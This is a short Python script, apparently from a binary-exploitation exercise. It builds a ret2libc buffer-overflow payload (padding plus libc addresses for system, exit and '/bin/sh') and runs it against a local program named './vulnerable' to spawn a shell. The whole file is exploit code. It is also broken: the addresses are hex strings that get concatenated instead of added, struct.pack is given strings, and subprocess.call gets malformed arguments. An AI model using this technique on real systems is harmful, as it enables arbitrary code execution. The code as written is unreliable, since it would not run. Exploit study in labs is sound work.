import struct
from subprocess import call

libc_base = '0xf7d87000'
system_offset = '0x0004f8e0'
exit_offset = '0x0003e5b0'
bin_sh_offset = '0x1bcde8'

system = libc_base + system_offset
exit = libc_base + exit_offset
bin_sh = libc_base + bin_sh_offset

def conv(num):
    return struct.pack("<I", num)

padding1 = 'A' * 64

padding2 = 'B' * 12
payload = padding2.encode() + conv(system) + conv(exit)+  conv(bin_sh)

print("Calling vulnerable program")
call("./vulnerable", padding1, payload)

